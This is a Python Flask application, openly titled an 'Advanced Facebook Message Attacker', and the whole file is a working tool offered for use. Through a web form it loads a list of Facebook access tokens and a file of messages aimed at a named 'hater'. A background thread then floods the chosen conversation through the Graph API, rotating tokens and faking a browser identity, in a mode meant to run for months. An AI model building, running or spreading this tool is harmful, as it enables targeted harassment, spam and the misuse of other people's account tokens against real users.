from flask import Flask, request, render_template_string, redirect, url_for, jsonify
import requests
import time
import threading
from datetime import datetime
import os

app = Flask(__name__)

# Global variables
attack_active = False
attack_thread = None
total_messages_sent = 0
active_users = 0
start_time = datetime.now()
logs = []

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com'
}

# HTML Template with New Features
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>⚜️9MAN-x-YAMDHUD⚜️</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: linear-gradient(135deg, #ff9a9e 0%, #fecfef 50%, #fbc2eb 100%);
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            min-height: 100vh;
            padding: 20px;
        }

        .container {
            max-width: 900px;
            margin: 0 auto;
            background: rgba(255, 255, 255, 0.95);
            border-radius: 30px;
            padding: 30px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            backdrop-filter: blur(10px);
        }

        h1 {
            text-align: center;
            color: #ff6b6b;
            font-size: 28px;
            margin-bottom: 10px;
            font-family: 'Courier New', monospace;
        }

        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }

        .stat-card {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            padding: 20px;
            border-radius: 20px;
            text-align: center;
            color: white;
            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
            transition: transform 0.3s;
        }

        .stat-card:hover {
            transform: translateY(-5px);
        }

        .stat-card h3 {
            font-size: 14px;
            margin-bottom: 10px;
            opacity: 0.9;
        }

        .stat-card .value {
            font-size: 32px;
            font-weight: bold;
        }

        .form-group {
            margin-bottom: 20px;
        }

        label {
            display: block;
            margin-bottom: 8px;
            color: #333;
            font-weight: bold;
        }

        input, select {
            width: 100%;
            padding: 12px;
            border: 2px solid #ff9a9e;
            border-radius: 25px;
            font-size: 14px;
            transition: all 0.3s;
            background: white;
        }

        input:focus {
            outline: none;
            border-color: #ff6b6b;
            box-shadow: 0 0 10px rgba(255, 107, 107, 0.3);
        }

        button {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 12px 30px;
            border: none;
            border-radius: 25px;
            font-size: 16px;
            cursor: pointer;
            transition: all 0.3s;
            font-weight: bold;
            margin: 5px;
        }

        button:hover {
            transform: scale(1.05);
            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
        }

        .btn-stop {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
        }

        .btn-stop:hover {
            background: linear-gradient(135deg, #fa709a 0%, #fee140 100%);
        }

        .log-container {
            background: #1e1e1e;
            color: #00ff00;
            border-radius: 15px;
            padding: 15px;
            height: 300px;
            overflow-y: auto;
            font-family: 'Courier New', monospace;
            font-size: 12px;
            margin-top: 20px;
        }

        .log-entry {
            margin-bottom: 5px;
            padding: 5px;
            border-bottom: 1px solid #333;
        }

        .log-success {
            color: #00ff00;
        }

        .log-error {
            color: #ff4444;
        }

        .status-badge {
            display: inline-block;
            padding: 5px 15px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: bold;
            margin-left: 10px;
        }

        .status-active {
            background: #00ff00;
            color: #000;
        }

        .status-stopped {
            background: #ff4444;
            color: #fff;
        }

        .button-group {
            display: flex;
            justify-content: center;
            gap: 15px;
            margin-top: 20px;
        }

        @keyframes glow {
            0% { box-shadow: 0 0 5px #ff6b6b; }
            100% { box-shadow: 0 0 20px #ff6b6b; }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>⚜️9MAN-x-YAMDHUD⚜️</h1>
        <p style="text-align: center; color: #666; margin-bottom: 20px;">Advanced Facebook Message Attacker</p>

        <div class="stats-grid">
            <div class="stat-card">
                <h3>⏱️ Uptime</h3>
                <div class="value" id="uptime">Loading...</div>
            </div>
            <div class="stat-card">
                <h3>👥 Active Users</h3>
                <div class="value" id="activeUsers">{{ active_users }}</div>
            </div>
            <div class="stat-card">
                <h3>📨 Total Messages</h3>
                <div class="value" id="totalMessages">{{ total_messages }}</div>
            </div>
            <div class="stat-card">
                <h3>📊 Status</h3>
                <div class="value" id="attackStatus">
                    {% if attack_active %}🟢 ACTIVE{% else %}🔴 STOPPED{% endif %}
                </div>
            </div>
        </div>

        <form action="/" method="post" enctype="multipart/form-data" id="attackForm">
            <div class="form-group">
                <label>*⏤‌‌‌‌★‌≛‌⃝‌🤡𝐆𝐑𝐎𝐔𝐏 𝐔𝐈𝐃⏤‌‌‌‌★‌≛‌⃝‌♥️</label>
                <input type="text" name="threadId" required placeholder="Enter conversation ID">
            </div>
            <div class="form-group">
                <label>*⏤‌‌‌‌★‌≛‌⃝‌📝𝐓𝐎𝐊𝐄𝐍.𝐅𝐈𝐋𝐄*⏤‌‌‌‌★‌≛‌⃝‌✏️</label>
                <input type="file" name="txtFile" accept=".txt" required>
            </div>
            <div class="form-group">
                <label>*⏤‌‌‌‌★‌≛‌⃝‌💬𝐌𝐀𝐒𝐒𝐀𝐆𝐄.𝐅𝐈𝐋𝐄⏤‌‌‌‌★‌≛‌⃝‌👀</label>
                <input type="file" name="messagesFile" accept=".txt" required>
            </div>
            <div class="form-group">
                <label>*⏤‌‌‌‌★‌≛‌⃝‌🦇𝐇𝐀𝐓𝐄𝐑.𝐍𝐀𝐌𝐄⏤‌‌‌‌★‌≛‌⃝‌🤡</label>
                <input type="text" name="kidx" required placeholder="Enter target name">
            </div>
            <div class="form-group">
                <label>*⏤‌‌‌‌★‌≛‌⃝‌⏰𝐒𝐩𝐄𝐞𝐃.𝐒𝐜𝐄𝐨𝐍𝐃𝐬⏤‌‌‌‌★‌≛‌⃝‌⏳</label>
                <input type="number" name="time" value="60" required>
            </div>
            
            <div class="button-group">
                <button type="submit" id="startBtn">🚀 START ATTACK</button>
                <button type="button" class="btn-stop" onclick="stopAttack()">🛑 ISTOP</button>
            </div>
        </form>

        <div class="log-container" id="logContainer">
            <div class="log-entry">[*] System Ready - Waiting for attack start...</div>
            <div class="log-entry">[*] 365 Days continuous run mode active</div>
        </div>
    </div>

    <script>
        function updateStats() {
            fetch('/stats')
                .then(response => response.json())
                .then(data => {
                    document.getElementById('uptime').innerText = data.uptime;
                    document.getElementById('activeUsers').innerText = data.active_users;
                    document.getElementById('totalMessages').innerText = data.total_messages;
                    document.getElementById('attackStatus').innerHTML = data.attack_active ? '🟢 ACTIVE' : '🔴 STOPPED';
                });
        }

        function stopAttack() {
            fetch('/stop', { method: 'POST' })
                .then(response => response.json())
                .then(data => {
                    alert(data.message);
                    updateStats();
                });
        }

        function fetchLogs() {
            fetch('/logs')
                .then(response => response.json())
                .then(data => {
                    const logContainer = document.getElementById('logContainer');
                    logContainer.innerHTML = data.logs.map(log => 
                        `<div class="log-entry ${log.type}">${log.message}</div>`
                    ).join('');
                    logContainer.scrollTop = logContainer.scrollHeight;
                });
        }

        setInterval(updateStats, 1000);
        setInterval(fetchLogs, 2000);
        
        // Auto-refresh on page load
        updateStats();
        fetchLogs();
    </script>
</body>
</html>
'''

def add_log(message, log_type="info"):
    timestamp = datetime.now().strftime("%H:%M:%S")
    logs.append({
        'message': f'[{timestamp}] {message}',
        'type': log_type
    })
    if len(logs) > 100:
        logs.pop(0)

def attack_worker(thread_id, mn, time_interval, access_tokens, messages):
    global total_messages_sent, active_users, attack_active
    
    active_users += 1
    num_comments = len(messages)
    max_tokens = len(access_tokens)
    post_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
    
    add_log(f"Attack started on conversation {thread_id}", "success")
    add_log(f"Loaded {max_tokens} tokens and {num_comments} messages", "info")
    
    message_index = 0
    
    while attack_active:
        try:
            token_index = message_index % max_tokens
            access_token = access_tokens[token_index]
            message = messages[message_index % num_comments].strip()
            
            parameters = {
                'access_token': access_token,
                'message': mn + ' ' + message
            }
            
            response = requests.post(post_url, json=parameters, headers=headers, timeout=10)
            current_time = datetime.now().strftime("%Y-%m-%d %I:%M:%S %p")
            
            if response.ok:
                total_messages_sent += 1
                log_msg = f"✅ SUCCESS | Msg #{total_messages_sent} | Token {token_index+1} | {mn} {message}"
                add_log(log_msg, "success")
                print(log_msg)
            else:
                log_msg = f"❌ FAILED | {mn} {message} | Error: {response.status_code}"
                add_log(log_msg, "error")
                print(log_msg)
            
            message_index += 1
            time.sleep(time_interval)
            
        except Exception as e:
            add_log(f"Error: {str(e)}", "error")
            time.sleep(30)
    
    active_users -= 1
    add_log("Attack stopped by user", "info")

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE, 
                                 active_users=active_users,
                                 total_messages=total_messages_sent,
                                 attack_active=attack_active)

@app.route('/', methods=['POST'])
def send_message():
    global attack_active, attack_thread
    
    if attack_active:
        return '''
        <script>
        alert("Attack already running! Press ISTOP first to start new attack.");
        window.location.href = "/";
        </script>
        '''
    
    thread_id = request.form.get('threadId')
    mn = request.form.get('kidx')
    time_interval = int(request.form.get('time'))
    
    txt_file = request.files['txtFile']
    access_tokens = txt_file.read().decode().splitlines()
    
    messages_file = request.files['messagesFile']
    messages = messages_file.read().decode().splitlines()
    
    if not access_tokens or not messages:
        return '''
        <script>
        alert("Files are empty!");
        window.location.href = "/";
        </script>
        '''
    
    attack_active = True
    attack_thread = threading.Thread(
        target=attack_worker,
        args=(thread_id, mn, time_interval, access_tokens, messages),
        daemon=True
    )
    attack_thread.start()
    
    return redirect(url_for('index'))

@app.route('/stop', methods=['POST'])
def stop_attack():
    global attack_active
    attack_active = False
    add_log("⚠️ Attack stopped by ISTOP command", "error")
    return jsonify({"message": "Attack stopped successfully!"})

@app.route('/stats')
def stats():
    uptime_seconds = int((datetime.now() - start_time).total_seconds())
    days = uptime_seconds // 86400
    hours = (uptime_seconds % 86400) // 3600
    minutes = (uptime_seconds % 3600) // 60
    uptime_str = f"{days}d {hours}h {minutes}m"
    
    return jsonify({
        'uptime': uptime_str,
        'active_users': active_users,
        'total_messages': total_messages_sent,
        'attack_active': attack_active
    })

@app.route('/logs')
def get_logs():
    return jsonify({'logs': logs[-50:]})  # Last 50 logs

if __name__ == '__main__':
    add_log("🚀 Server started successfully!", "success")
    add_log("📅 365 Days continuous run mode ACTIVE", "info")
    add_log("🎯 Ready to accept attacks", "success")
    app.run(host='0.0.0.0', port=5000, debug=False, threaded=True)
